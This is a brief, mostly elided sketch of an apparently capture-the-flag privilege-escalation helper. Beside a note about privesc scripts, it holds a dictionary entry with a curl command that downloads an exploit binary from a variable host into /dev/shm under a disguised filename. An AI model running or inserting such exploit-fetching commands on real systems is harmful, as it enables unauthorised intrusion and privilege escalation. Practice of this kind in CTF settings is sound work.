...
- Always check `enable` with script PrivEscs
...
def main():
    ...
    SomeListDeclaredAbove={
        "💀 Root for the root god, NT Systems for the FlagPwn":f"curl http://{somevariblehere}/exploit.elf -o /dev/shm/shimmy-ya"
        # ... ad nausuem!
    }   
